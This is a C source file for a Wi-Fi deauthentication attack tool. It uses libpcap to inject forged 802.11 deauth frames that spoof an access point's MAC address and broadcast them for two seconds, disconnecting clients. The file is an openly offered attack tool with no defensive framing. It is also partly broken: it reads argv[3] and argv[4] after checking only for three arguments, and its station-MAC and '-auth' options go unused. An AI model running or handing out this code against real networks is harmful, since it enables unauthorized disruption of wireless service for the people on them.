#include <stdio.h>
#include <stdint.h>
#include <pcap.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include "deauth.h"
#include <time.h>

void usage();
void AP_broadcast_frame(struct Packet *packet);
void initPacket(struct Packet *packet, char *ap_mac);
void macStringToUint8(char *mac_string, uint8_t *ap_mac);

int main(int argc, char *argv[]){
    if (argc < 3){
        usage();
        return -1;
    }

    char *interfaceName = argv[1];
    char *ap_mac = argv[2];
    uint8_t *station_mac = argv[3];
    char *auth = argv[4];

    struct Packet packet;
    initPacket(&packet, argv[2]);
    AP_broadcast_frame(&packet);

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(interfaceName, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL){
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", interfaceName, errbuf);
        return -1;
    }

    time_t start_time = time(NULL);
    while ((time(NULL) - start_time) < 2) {
        if (pcap_sendpacket(handle, (unsigned char *)&packet, sizeof(packet)) != 0){
            printf("send fail\n");
            exit(-1);
        }
        usleep(10000);
    }

    pcap_close(handle);
    printf("pcap close!\n");

    return 0;
}

void usage(){
    printf("syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n");
    printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

void initPacket(struct Packet *packet, char *ap_mac){
    memset(packet, 0, sizeof(struct Packet));
    packet->radiotap.it_len = 0x0018;

    uint32_t padding[4] = {0x00,0x00,0x00,0x00};
    memcpy(packet->radiotap.padding, padding, sizeof(padding));

    packet->deauth.type = 0xc0;

    macStringToUint8(ap_mac, packet->deauth.source_address);
    macStringToUint8(ap_mac, packet->deauth.bssid);
}

void AP_broadcast_frame(struct Packet *packet){
    memset(packet->deauth.destination_address, 0xFF, 6);
    packet->fixed.reason_code = 0x0007;
}

void macStringToUint8(char *mac_string, uint8_t *ap_mac){
    sscanf(mac_string, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
           &ap_mac[0], &ap_mac[1], &ap_mac[2],
           &ap_mac[3], &ap_mac[4], &ap_mac[5]);
}
